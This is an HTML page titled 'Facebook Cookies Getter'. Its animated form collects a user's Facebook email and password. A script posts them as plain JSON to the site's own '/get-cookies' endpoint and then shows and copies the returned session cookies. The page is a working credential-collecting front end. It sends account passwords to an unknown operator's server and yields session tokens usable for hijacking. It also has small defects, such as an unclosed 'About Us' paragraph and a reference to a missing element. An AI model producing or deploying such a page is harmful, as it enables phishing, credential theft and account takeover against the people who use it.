<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Cookies Getter</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://unpkg.com/tippy.js@6.3.2/dist/tippy.css" rel="stylesheet">
    <style>
        .scrollable {
            max-height: 200px;
            overflow-y: auto;
        }

        .title-gradient, .color-changing {
            animation: float 3s ease-in-out infinite, colorChange 6s infinite;
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(0);
            }
            50% {
                transform: translateY(-10px);
            }
        }

        @keyframes colorChange {
            0% {
                color: #4f46e5;
            }
            33% {
                color: #cb4feb;
            }
            66% {
                color: #4f46e5;
            }
            100% {
                color: #cb4feb;
            }
        }

        input[type="email"],
        input[type="password"] {
            animation: float 3s ease-in-out infinite, neonGlow 2s infinite;
            background-color: #ffffff;
            color: #000000;
        }

        @keyframes neonGlow {
            0% {
                box-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 15px #00ff00, 0 0 20px #00ff00, 0 0 25px #00ff00, 0 0 30px #00ff00, 0 0 35px #00ff00;
            }
            50% {
                box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000, 0 0 40px #ff0000, 0 0 50px #ff0000, 0 0 60px #ff0000, 0 0 70px #ff0000;
            }
            100% {
                box-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 15px #00ff00, 0 0 20px #00ff00, 0 0 25px #00ff00, 0 0 30px #00ff00, 0 0 35px #00ff00;
            }
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .pulse {
            animation: pulse 1s infinite alternate;
        }

        @keyframes pulse {
            from {
                transform: scale(1);
            }
            to {
                transform: scale(1.05);
            }
        }

        .about-us-section {
            background-color: #1a202c;
            color: #cbd5e0;
            padding: 4rem 0;
            animation: bgChange 10s infinite;
        }

        @keyframes bgChange {
            0% {
                background-color: #1a202c;
            }
            25% {
                background-color: #4f46e5;
            }
            50% {
                background-color: #cb4feb;
            }
            75% {
                background-color: #ff0000;
            }
            100% {
                background-color: #1a202c;
            }
        }

        .about-us-content {
            max-width: 800px;
            margin: 0 auto;
            text-align: center;
            animation: textChange 10s infinite;
        }

        @keyframes textChange {
            0% {
                color: #cbd5e0;
            }
            25% {
                color: #4f46e5;
            }
            50% {
                color: #cb4feb;
            }
            75% {
                color: #ff0000;
            }
            100% {
                color: #cbd5e0;
            }
        }

        .about-us-title {
            font-size: 2rem;
            font-weight: bold;
            margin-bottom: 2rem;
            animation: titleChange 10s infinite;
        }

        @keyframes titleChange {
            0% {
                color: #4f46e5;
            }
            25% {
                color: #cb4feb;
            }
            50% {
                color: #ff0000;
            }
            75% {
                color: #1a202c;
            }
            100% {
                color: #4f46e5;
            }
        }

        .about-us-description {
            font-size: 1.2rem;
            animation: descChange 10s infinite;
        }

        @keyframes descChange {
            0% {
                color: #cbd5e0;
            }
            25% {
                color: #4f46e5;
            }
            50% {
                color: #cb4feb;
            }
            75% {
                color: #ff0000;
            }
            100% {
                color: #cbd5e0;
            }
        }

        .footer {
            background-color: #1a202c;
            color: #cbd5e0;
            padding: 2rem 0;
            text-align: center;
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            animation: footerChange 10s infinite;
        }

        @keyframes footerChange {
            0% {
                background-color: #1a202c;
                color: #cbd5e0;
            }
            25% {
                background-color: #4f46e5;
                color: #ff0000;
            }
            50% {
                background-color: #cb4feb;
                color: #cb4feb;
            }
            75% {
                background-color: #ff0000;
                color: #4f46e5;
            }
            100% {
                background-color: #1a202c;
                color: #cbd5e0;
            }
        }

        .copyright {
            font-size: 0.9rem;
            color: #6b7280;
            animation: copyrightChange 10s infinite;
        }

        @keyframes copyrightChange {
            0% {
                color: #6b7280;
            }
            25% {
                color: #4f46e5;
            }
            50% {
                color: #cb4feb;
            }
            75% {
                color: #ff0000;
            }
            100% {
                color: #6b7280;
            }
        }
    </style>
</head>

<body class="bg-white text-black font-poppins">
    <div class="container mx-auto py-8 dark-shadow">
        <h1 class="text-3xl font-bold mb-8 text-center title-gradient">Facebook Cookies Getter</h1>
        <div class="max-w-md mx-auto">
            <form id="cookiesForm" class="space-y-4 fade-in">
                <div>
                    <label for="email" class="block font-medium color-changing">Email:</label>
                    <input type="email" id="email" name="email" class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:border-cyan-600"
                        required autofocus data-tippy-content="Enter your email address">
                </div>
                <div>
                    <label for="password" class="block font-medium color-changing">Password:</label>
                    <input type="password" id="password" name="password" class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:border-blue-500"
                        required data-tippy-content="Enter your password">
                </div>
                <div class="flex justify-between items-center">
                    <button type="submit" id="submitButton"
                        class="bg-blue-500 text-white py-2 px-4 rounded hover:bg-blue-600 focus:outline-none focus:ring focus:ring-blue-200 pulse"
                        data-tippy-content="Get Cookies">
                        <span id="submitText">Get Cookies</span>
                        <i id="loadingSpinner" class="fas fa-spinner fa-spin ml-3 hidden" aria-hidden="true"></i>
                    </button>
                    <button type="button" id="clearButton"
                        class="bg-gray-300 text-gray-700 py-2 px-4 rounded hover:bg-gray-400 focus:outline-none focus:ring focus:ring-gray-200 color-changing"
                        data-tippy-content="Clear Form">
                        <i class="fas fa-trash-alt" aria-hidden="true"></i> Clear
                    </button>
                </div>
            </form>
            <div id="cookiesResult" class="mt-4 hidden fade-in">
                <h2 class="text-lg font-medium mb-2">Extracted Cookies:</h2>
                <div id="cookiesList" class="border border-gray-300 rounded p-4 scrollable"></div>
                <button id="copyButton"
                    class="bg-gray-300 text-gray-700 py-2 px-4 rounded mt-2 hover:bg-gray-400 focus:outline-none focus:ring focus:ring-gray-200 color-changing"
                    data-tippy-content="Copy Cookies">
                    <i class="far fa-copy" aria-hidden="true"></i> Copy Cookies
                </button>
            </div>
        </div>
    </div>

    <div class="about-us-section">
        <div class="about-us-content">
            <h2 class="about-us-title color-changing">About Us</h2>
            <p class="about-us-description"> Ala
    </div>

    <footer class="footer">
        <p class="copyright color-changing">&copy; Jay mwa</p>
    </footer>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastify-js/1.10.0/toastify.min.js"></script>
    <script>
        const cookiesForm = document.getElementById('cookiesForm');
        const submitButton = document.getElementById('submitButton');
        const clearButton = document.getElementById('clearButton');
        const copyButton = document.getElementById('copyButton');
        const submitText = document.getElementById('submitText');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const cookiesResult = document.getElementById('cookiesResult');
        const cookiesList = document.getElementById('cookiesList');
        const uidInput = document.getElementById('uid');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');

        cookiesForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            submitButton.disabled = true;
            submitText.textContent = 'Loading...';
            loadingSpinner.classList.remove('hidden');
            cookiesResult.classList.add('hidden');

            const formData = new FormData(e.target);
            const email = formData.get('email');
            const password = formData.get('password');

            try {
                const response = await fetch('/get-cookies', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ email, password })
                });
                const data = await response.json();
                cookiesList.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
                cookiesResult.classList.remove('hidden');
                showToast('success', 'Cookies extracted successfully');
            } catch (error) {
                showToast('error', 'An error occurred. Please try again later.');
            } finally {
                submitButton.disabled = false;
                submitText.textContent = 'Get Cookies';
                loadingSpinner.classList.add('hidden');
            }
        });

        clearButton.addEventListener('click', () => {
            cookiesForm.reset();
            cookiesResult.classList.add('hidden');
        });

        copyButton.addEventListener('click', () => {
            const cookiesText = cookiesList.textContent;
            navigator.clipboard.writeText(cookiesText).then(() => {
                showToast('success', 'Cookies copied to clipboard!');
            }).catch((error) => {
                showToast('error', 'Failed to copy cookies.');
                console.error('Failed to copy cookies: ', error);
            });
        });

        function showToast(type, message) {
            Toastify({
                text: message,
                duration: 3000,
                close: true,
                gravity: 'top',
                position: 'center',
                backgroundColor: type === 'success' ? '#48bb78' : '#f56565'
            }).showToast();
        }
    </script>
</body>

</html>
